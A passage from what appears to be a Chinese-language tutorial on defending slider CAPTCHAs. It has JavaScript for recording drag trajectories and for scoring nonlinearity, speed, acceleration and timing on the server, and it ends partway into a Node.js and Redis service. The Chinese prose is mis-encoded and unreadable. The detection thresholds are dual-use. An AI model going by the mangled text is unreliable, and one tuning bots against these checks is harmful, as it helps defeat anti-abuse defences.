<p>è¿™æ˜¯æ»‘å—éªŒè¯ç æœ€ç²¾å¦™çš„åœ°æ–¹ã€‚å°±åƒäººçš„ç¬”è¿¹ä¸€æ ·ï¼Œæ¯ä¸ªäººçš„æ‹–åŠ¨è½¨è¿¹éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œè€Œæœºå™¨äººçš„"ç¬”è¿¹"å¾€å¾€è¿‡äºå·¥æ•´ã€‚</p>
<h3 data-id="heading-7">ä»€ä¹ˆæ˜¯éçº¿æ€§è½¨è¿¹ï¼Ÿ</h3>
<p>äººç±»æ‹–åŠ¨æ»‘å—æ—¶ï¼Œè½¨è¿¹æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">å¼€å§‹ â”€â”€â”€â”€â•²    â•±â”€â”€â”€â”€â•²      â•±â”€â”€â”€â”€ ç»“æŸ
<span class="hljs-code">            â•²  â•±      â•²    â•±
             â•²â•±        â•²â”€â”€â•±
</span></code></pre>
<p>è€Œæœºå™¨äººçš„"å®Œç¾"è½¨è¿¹æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs">å¼€å§‹ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ç»“æŸ
</code></pre>
<h3 data-id="heading-8">å®ç°åŸç†</h3>
<p>æˆ‘ä»¬éœ€è¦é‡‡é›†æ‹–åŠ¨è¿‡ç¨‹ä¸­çš„è½¨è¿¹ç‚¹ï¼Œç„¶ååˆ†æè¿™äº›ç‚¹çš„åˆ†å¸ƒç‰¹å¾ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯è½¨è¿¹é‡‡é›†</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TrajectoryCollector</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-literal">null</span>;
  }

  <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span> = [];
  }

  <span class="hljs-title function_">record</span>(<span class="hljs-params">x, y</span>) {
    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span>.<span class="hljs-title function_">push</span>({ x, y, <span class="hljs-attr">t</span>: timestamp });
  }

  <span class="hljs-title function_">getTrajectory</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">trajectory</span>;
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> collector = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrajectoryCollector</span>();

slider.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, <span class="hljs-function">() =&gt;</span> {
  collector.<span class="hljs-title function_">start</span>();
});

slider.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (isDragging) {
    collector.<span class="hljs-title function_">record</span>(e.<span class="hljs-property">clientX</span>, e.<span class="hljs-property">clientY</span>);
  }
});
</code></pre>
<h3 data-id="heading-9">éçº¿æ€§æ£€æµ‹ç®—æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯è½¨è¿¹åˆ†æï¼ˆNode.jsï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">analyzeTrajectory</span>(<span class="hljs-params">trajectory</span>) {
  <span class="hljs-comment">// 1. è®¡ç®—ç›¸é‚»ç‚¹çš„åå·®</span>
  <span class="hljs-keyword">const</span> deviations = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> prev = trajectory[i - <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> curr = trajectory[i];
    
    <span class="hljs-comment">// è®¡ç®—è§’åº¦åå·®</span>
    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">1</span>) {
      <span class="hljs-keyword">const</span> prev2 = trajectory[i - <span class="hljs-number">2</span>];
      <span class="hljs-keyword">const</span> angle1 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">atan2</span>(prev.<span class="hljs-property">y</span> - prev2.<span class="hljs-property">y</span>, prev.<span class="hljs-property">x</span> - prev2.<span class="hljs-property">x</span>);
      <span class="hljs-keyword">const</span> angle2 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">atan2</span>(curr.<span class="hljs-property">y</span> - prev.<span class="hljs-property">y</span>, curr.<span class="hljs-property">x</span> - prev.<span class="hljs-property">x</span>);
      <span class="hljs-keyword">const</span> deviation = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(angle2 - angle1);
      deviations.<span class="hljs-title function_">push</span>(deviation);
    }
  }

  <span class="hljs-comment">// 2. ç»Ÿè®¡åå·®ç‰¹å¾</span>
  <span class="hljs-keyword">const</span> avgDeviation = deviations.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / deviations.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> maxDeviation = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(...deviations);
  
  <span class="hljs-comment">// 3. åˆ¤æ–­æ˜¯å¦ä¸ºçº¿æ€§</span>
  <span class="hljs-comment">// äººç±»æ‹–åŠ¨é€šå¸¸ä¼šæœ‰æ˜æ˜¾çš„æ–¹å‘å˜åŒ–ï¼ˆæ‰‹æŠ–ã€è°ƒæ•´ç­‰ï¼‰</span>
  <span class="hljs-comment">// æœºå™¨äººé€šå¸¸æ˜¯ç›´çº¿æˆ–å¹³æ»‘æ›²çº¿</span>
  <span class="hljs-keyword">const</span> isLinear = avgDeviation &lt; <span class="hljs-number">0.1</span> &amp;&amp; maxDeviation &lt; <span class="hljs-number">0.3</span>;
  
  <span class="hljs-keyword">return</span> {
    isLinear,
    <span class="hljs-attr">score</span>: isLinear ? <span class="hljs-number">0</span> : <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">100</span>, avgDeviation * <span class="hljs-number">100</span>),
    <span class="hljs-attr">details</span>: { avgDeviation, maxDeviation, <span class="hljs-attr">pointCount</span>: trajectory.<span class="hljs-property">length</span> }
  };
}
</code></pre>
<h3 data-id="heading-10">ä¸ºä»€ä¹ˆè¿™å¾ˆæœ‰æ•ˆï¼Ÿ</h3>
<p>æ ¹æ® "The robustness of behavior-verification-based slider CAPTCHAs"ï¼ˆJournal of Information Security and Applications, 2024ï¼‰çš„ç ”ç©¶ï¼Œç®€å•çš„è‡ªåŠ¨åŒ–è„šæœ¬å¾ˆéš¾æ¨¡æ‹Ÿå‡ºçœŸå®çš„éçº¿æ€§è½¨è¿¹ã€‚å³ä½¿ä½¿ç”¨è´å¡å°”æ›²çº¿æ¨¡æ‹Ÿï¼Œä¹Ÿä¼šåœ¨æŸäº›ç‰¹å¾ä¸Šéœ²å‡ºé©¬è„šã€‚</p>
<h2 data-id="heading-11">ç¬¬ä¸‰é“é˜²çº¿ï¼šé€Ÿåº¦å˜åŒ–åˆ†æ</h2>
<p>äººç±»æ‹–åŠ¨æ»‘å—çš„é€Ÿåº¦ä¸æ˜¯æ’å®šçš„ï¼Œå°±åƒä½ å¼€è½¦ä¸€æ ·ï¼šå¯åŠ¨æ—¶æ…¢ã€ä¸­é€”åŠ é€Ÿã€å¿«åˆ°ä½æ—¶å‡é€Ÿã€‚è€Œæœºå™¨äººå¾€å¾€ä¼šä»¥æ’å®šé€Ÿåº¦"è¡Œé©¶"ã€‚</p>
<h3 data-id="heading-12">é€Ÿåº¦æ›²çº¿ç‰¹å¾</h3>
<pre><code class="hljs">é€Ÿåº¦
 â”‚
 â”‚       â•±â•²
 â”‚      â•±  â•²
 â”‚     â•±    â•²
 â”‚    â•±      â•²
 â”‚   â•±        â•²
 â”‚  â•±          â•²___
 â”‚ â•±                â•²
 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æ—¶é—´
  æ…¢â†’å¿«â†’æ…¢â†’è°ƒæ•´â†’å®Œæˆ
</code></pre>
<h3 data-id="heading-13">é€Ÿåº¦åˆ†æç®—æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">analyzeSpeed</span>(<span class="hljs-params">trajectory</span>) {
  <span class="hljs-keyword">const</span> speeds = [];
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> prev = trajectory[i - <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> curr = trajectory[i];
    
    <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">x</span> - prev.<span class="hljs-property">x</span>, <span class="hljs-number">2</span>) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">y</span> - prev.<span class="hljs-property">y</span>, <span class="hljs-number">2</span>)
    );
    <span class="hljs-keyword">const</span> timeDiff = curr.<span class="hljs-property">t</span> - prev.<span class="hljs-property">t</span>;
    
    <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
      speeds.<span class="hljs-title function_">push</span>(distance / timeDiff);
    }
  }

  <span class="hljs-comment">// åˆ†æé€Ÿåº¦å˜åŒ–ç‰¹å¾</span>
  <span class="hljs-keyword">const</span> avgSpeed = speeds.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / speeds.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> variance = speeds.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, speed</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> sum + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(speed - avgSpeed, <span class="hljs-number">2</span>);
  }, <span class="hljs-number">0</span>) / speeds.<span class="hljs-property">length</span>;
  
  <span class="hljs-comment">// é€Ÿåº¦å˜åŒ–æ–¹å·®è¿‡å°è¯´æ˜æ˜¯åŒ€é€Ÿè¿åŠ¨ï¼ˆæœºå™¨äººç‰¹å¾ï¼‰</span>
  <span class="hljs-keyword">const</span> isConstantSpeed = variance &lt; <span class="hljs-number">0.5</span>;
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰æ˜æ˜¾çš„åŠ é€Ÿ-å‡é€Ÿè¿‡ç¨‹</span>
  <span class="hljs-keyword">let</span> hasAccelDecel = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (speeds.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) {
    <span class="hljs-keyword">const</span> firstHalf = speeds.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(speeds.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>));
    <span class="hljs-keyword">const</span> secondHalf = speeds.<span class="hljs-title function_">slice</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(speeds.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>));
    
    <span class="hljs-keyword">const</span> avgFirst = firstHalf.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / firstHalf.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> avgSecond = secondHalf.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / secondHalf.<span class="hljs-property">length</span>;
    
    <span class="hljs-comment">// å‰åŠæ®µå’ŒååŠæ®µæœ‰æ˜æ˜¾å·®å¼‚ï¼ˆåŠ é€Ÿåå‡é€Ÿï¼‰</span>
    hasAccelDecel = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(avgFirst - avgSecond) &gt; avgSpeed * <span class="hljs-number">0.3</span>;
  }

  <span class="hljs-keyword">return</span> {
    isConstantSpeed,
    hasAccelDecel,
    <span class="hljs-attr">score</span>: (!isConstantSpeed &amp;&amp; hasAccelDecel) ? <span class="hljs-number">100</span> : <span class="hljs-number">50</span>,
    <span class="hljs-attr">details</span>: { avgSpeed, variance, <span class="hljs-attr">speeds</span>: speeds.<span class="hljs-property">length</span> }
  };
}
</code></pre>
<h3 data-id="heading-14">å®æˆ˜æŠ€å·§</h3>
<p><strong>é€Ÿåº¦é˜ˆå€¼è®¾ç½®</strong>ï¼š</p>
<ul>
<li>è¿‡å¿«ï¼ˆ&lt; 100msï¼‰ï¼šå¯èƒ½æ˜¯è„šæœ¬ç›´æ¥è®¾ç½®ä½ç½®</li>
<li>è¿‡æ…¢ï¼ˆ&gt; 10sï¼‰ï¼šå¯èƒ½æ˜¯äººå·¥æ‰“ç æˆ–ä½è´¨é‡è„šæœ¬</li>
<li>æ¨èå®Œæˆæ—¶é—´ï¼š500ms - 3000ms</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»¼åˆæ—¶é—´æ£€æŸ¥</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkTimeWindow</span>(<span class="hljs-params">trajectory</span>) {
  <span class="hljs-keyword">const</span> totalTime = trajectory[trajectory.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">t</span>;
  
  <span class="hljs-keyword">if</span> (totalTime &lt; <span class="hljs-number">100</span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Too fast - likely automated'</span> };
  }
  <span class="hljs-keyword">if</span> (totalTime &gt; <span class="hljs-number">10000</span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Too slow - possible manual farm'</span> };
  }
  
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">duration</span>: totalTime };
}
</code></pre>
<h2 data-id="heading-15">ç¬¬å››é“é˜²çº¿ï¼šåŠ é€Ÿåº¦æ¨¡å¼è¯†åˆ«</h2>
<p>åŠ é€Ÿåº¦æ˜¯æ¯”é€Ÿåº¦æ›´æ·±ä¸€å±‚çš„ç‰¹å¾ã€‚äººç±»æ‰‹çš„è‚Œè‚‰ååº”æ˜¯æœ‰ç‰©ç†æƒ¯æ€§çš„ï¼Œè€Œç¨‹åºç”Ÿæˆçš„è¿åŠ¨å¾€å¾€å¿½ç•¥è¿™ä¸€ç‚¹ã€‚</p>
<h3 data-id="heading-16">åŠ é€Ÿåº¦æ›²çº¿ç‰¹å¾</h3>
<p>äººç±»çš„åŠ é€Ÿåº¦æ›²çº¿åº”è¯¥ç¬¦åˆç‰©ç†è§„å¾‹ï¼š</p>
<ul>
<li>å¯åŠ¨æ—¶éœ€è¦å…‹æœé™æ‘©æ“¦åŠ›ï¼ˆåŠ é€Ÿåº¦å¤§ï¼‰</li>
<li>åŒ€é€Ÿé˜¶æ®µåŠ é€Ÿåº¦æ¥è¿‘0</li>
<li>åˆ¶åŠ¨æ—¶åŠ é€Ÿåº¦ä¸ºè´Ÿå€¼</li>
<li>æ•´ä¸ªè¿‡ç¨‹æœ‰è½»å¾®çš„æŠ–åŠ¨ï¼ˆè‚Œè‚‰éœ‡é¢¤ï¼‰</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">analyzeAcceleration</span>(<span class="hljs-params">trajectory</span>) {
  <span class="hljs-keyword">const</span> accelerations = [];
  
  <span class="hljs-comment">// å…ˆè®¡ç®—é€Ÿåº¦</span>
  <span class="hljs-keyword">const</span> speeds = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> prev = trajectory[i - <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> curr = trajectory[i];
    <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">x</span> - prev.<span class="hljs-property">x</span>, <span class="hljs-number">2</span>) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">y</span> - prev.<span class="hljs-property">y</span>, <span class="hljs-number">2</span>)
    );
    <span class="hljs-keyword">const</span> timeDiff = curr.<span class="hljs-property">t</span> - prev.<span class="hljs-property">t</span>;
    <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
      speeds.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">speed</span>: distance / timeDiff,
        <span class="hljs-attr">time</span>: curr.<span class="hljs-property">t</span>
      });
    }
  }

  <span class="hljs-comment">// è®¡ç®—åŠ é€Ÿåº¦ï¼ˆé€Ÿåº¦çš„å˜åŒ–ç‡ï¼‰</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; speeds.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> speedDiff = speeds[i].<span class="hljs-property">speed</span> - speeds[i - <span class="hljs-number">1</span>].<span class="hljs-property">speed</span>;
    <span class="hljs-keyword">const</span> timeDiff = speeds[i].<span class="hljs-property">time</span> - speeds[i - <span class="hljs-number">1</span>].<span class="hljs-property">time</span>;
    <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
      accelerations.<span class="hljs-title function_">push</span>(speedDiff / timeDiff);
    }
  }

  <span class="hljs-comment">// åˆ†æåŠ é€Ÿåº¦ç‰¹å¾</span>
  <span class="hljs-keyword">const</span> positiveAccel = accelerations.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a &gt; <span class="hljs-number">0</span>).<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> negativeAccel = accelerations.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a &lt; <span class="hljs-number">0</span>).<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> nearZeroAccel = accelerations.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(a) &lt; <span class="hljs-number">0.1</span>).<span class="hljs-property">length</span>;
  
  <span class="hljs-comment">// åˆç†çš„åŠ é€Ÿåº¦åˆ†å¸ƒåº”è¯¥æ˜¯ï¼šå…ˆæ­£ï¼ˆåŠ é€Ÿï¼‰ã€åæ¥è¿‘0ï¼ˆåŒ€é€Ÿï¼‰ã€æœ€åè´Ÿï¼ˆå‡é€Ÿï¼‰</span>
  <span class="hljs-keyword">const</span> total = accelerations.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> firstThird = accelerations.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(total / <span class="hljs-number">3</span>));
  <span class="hljs-keyword">const</span> lastThird = accelerations.<span class="hljs-title function_">slice</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(total * <span class="hljs-number">2</span> / <span class="hljs-number">3</span>));
  
  <span class="hljs-keyword">const</span> avgFirst = firstThird.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / firstThird.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> avgLast = lastThird.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / lastThird.<span class="hljs-property">length</span>;
  
  <span class="hljs-comment">// æ­£å¸¸æƒ…å†µï¼šå‰åŠæ®µåŠ é€Ÿåº¦ä¸ºæ­£ï¼ŒååŠæ®µä¸ºè´Ÿ</span>
  <span class="hljs-keyword">const</span> hasNaturalPattern = avgFirst &gt; <span class="hljs-number">0.05</span> &amp;&amp; avgLast &lt; -<span class="hljs-number">0.05</span>;

  <span class="hljs-keyword">return</span> {
    hasNaturalPattern,
    <span class="hljs-attr">score</span>: hasNaturalPattern ? <span class="hljs-number">100</span> : <span class="hljs-number">30</span>,
    <span class="hljs-attr">details</span>: {
      <span class="hljs-attr">positiveRatio</span>: positiveAccel / total,
      <span class="hljs-attr">negativeRatio</span>: negativeAccel / total,
      <span class="hljs-attr">avgFirstPhase</span>: avgFirst,
      <span class="hljs-attr">avgLastPhase</span>: avgLast
    }
  };
}
</code></pre>
<h2 data-id="heading-17">ç¬¬äº”é“é˜²çº¿ï¼šæ—¶é—´çª—å£æ§åˆ¶</h2>
<p>è¿™å°±åƒæ˜¯æˆ‘ä»¬ç»™éªŒè¯è¿‡ç¨‹è®¾ç½®äº†ä¸€ä¸ª"æœ‰æ•ˆæœŸ"ã€‚éªŒè¯ç tokenç”Ÿæˆåï¼Œå¦‚æœåœ¨æçŸ­æ—¶é—´å†…å°±æäº¤éªŒè¯ï¼Œæˆ–è€…æ‹–äº†å¾ˆä¹…æ‰æäº¤ï¼Œéƒ½å¯èƒ½æ˜¯å¼‚å¸¸è¡Œä¸ºã€‚</p>
<h3 data-id="heading-18">æ—¶é—´çª—å£ç­–ç•¥</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯æ—¶é—´çª—å£éªŒè¯</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyTimeWindow</span>(<span class="hljs-params">token, clientTimestamp</span>) {
  <span class="hljs-keyword">const</span> captchaData = <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">get</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>);
  <span class="hljs-keyword">if</span> (!captchaData) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Token expired or invalid'</span> };
  }

  <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(captchaData);
  <span class="hljs-keyword">const</span> serverTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">const</span> createdAt = data.<span class="hljs-property">createdAt</span>;
  
  <span class="hljs-comment">// æ£€æŸ¥tokenæ˜¯å¦åœ¨æœ‰æ•ˆæœŸå†…ï¼ˆ5åˆ†é’Ÿï¼‰</span>
  <span class="hljs-keyword">if</span> (serverTime - createdAt &gt; <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Token expired'</span> };
  }

  <span class="hljs-comment">// æ£€æŸ¥å®¢æˆ·ç«¯æäº¤æ—¶é—´æ˜¯å¦åˆç†ï¼ˆé˜²é‡æ”¾æ”»å‡»ï¼‰</span>
  <span class="hljs-keyword">const</span> timeOnClient = clientTimestamp - createdAt;
  <span class="hljs-keyword">if</span> (timeOnClient &lt; <span class="hljs-number">200</span>) { <span class="hljs-comment">// å°äº200msï¼Œå¤ªå¿«äº†</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Suspiciously fast completion'</span> };
  }
  <span class="hljs-keyword">if</span> (timeOnClient &gt; <span class="hljs-number">4</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>) { <span class="hljs-comment">// è¶…è¿‡4åˆ†é’Ÿ</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Suspiciously slow completion'</span> };
  }

  <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">true</span> };
}
</code></pre>
<h2 data-id="heading-19">å®æˆ˜æ¼”ç¤ºï¼šä¼ä¸šçº§å®ç°æ–¹æ¡ˆ</h2>
<p>è¯´äº†é‚£ä¹ˆå¤šç†è®ºï¼Œç°åœ¨æ¥ä¸Šç¡¬èœã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäº <strong>Node.js + Redis</strong> çš„ä¼ä¸šçº§æ»‘å—éªŒè¯ç å®ç°æ–¹æ¡ˆï¼Œå‚è€ƒäº† GitHub ä¸Šçƒ­é—¨çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkartikmehta8%2Fcaptcha" target="_blank" title="https://github.com/kartikmehta8/captcha" ref="nofollow noopener noreferrer">kartikmehta8/captcha</a> é¡¹ç›®æ¶æ„ã€‚</p>
<h3 data-id="heading-20">æŠ€æœ¯æ ˆ</h3>
<ul>
<li><strong>Node.js &gt;= 16</strong>: æœåŠ¡ç«¯è¿è¡Œç¯å¢ƒ</li>
<li><strong>Express</strong>: Webæ¡†æ¶</li>
<li><strong>Redis &gt;= 6</strong>: çŠ¶æ€å­˜å‚¨å’Œé™æµ</li>
<li><strong>Canvas</strong>: å›¾ç‰‡ç”Ÿæˆ</li>
<li><strong>Joi</strong>: å‚æ•°æ ¡éªŒ</li>
</ul>
<h3 data-id="heading-21">é¡¹ç›®ç»“æ„</h3>
<pre><code class="hljs language-bash" lang="bash">captcha-service/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ config/
â”‚   â”‚   â””â”€â”€ index.js          <span class="hljs-comment"># é…ç½®æ–‡ä»¶</span>
â”‚   â”œâ”€â”€ controllers/
â”‚   â”‚   â””â”€â”€ captcha.js        <span class="hljs-comment"># éªŒè¯ç æ§åˆ¶å™¨</span>
â”‚   â”œâ”€â”€ services/
â”‚   â”‚   â”œâ”€â”€ captcha.js        <span class="hljs-comment"># æ ¸å¿ƒæœåŠ¡é€»è¾‘</span>
â”‚   â”‚   â””â”€â”€ validator.js      <span class="hljs-comment"># è¡Œä¸ºåˆ†æå™¨</span>
â”‚   â”œâ”€â”€ utils/
â”‚   â”‚   â”œâ”€â”€ image.js          <span class="hljs-comment"># å›¾ç‰‡ç”Ÿæˆå·¥å…·</span>
â”‚   â”‚   â””â”€â”€ crypto.js         <span class="hljs-comment"># åŠ å¯†å·¥å…·</span>
â”‚   â””â”€â”€ app.js                <span class="hljs-comment"># åº”ç”¨å…¥å£</span>
â”œâ”€â”€ package.json
â””â”€â”€ README.md
</code></pre>
<h3 data-id="heading-22">æ ¸å¿ƒä»£ç å®ç°</h3>
<h4 data-id="heading-23">1. éªŒè¯ç ç”ŸæˆæœåŠ¡</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/services/captcha.js</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
<span class="hljs-keyword">const</span> { createCanvas } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'canvas'</span>);
<span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../config/redis'</span>);

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CaptchaService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> = <span class="hljs-number">300</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> = <span class="hljs-number">150</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> = <span class="hljs-number">50</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderHeight</span> = <span class="hljs-number">50</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tolerance</span> = <span class="hljs-number">5</span>; <span class="hljs-comment">// è¯¯å·®å®¹å¿åº¦ Â±5px</span>
  }

  <span class="hljs-comment">// ç”ŸæˆéªŒè¯ç </span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params"/>) {
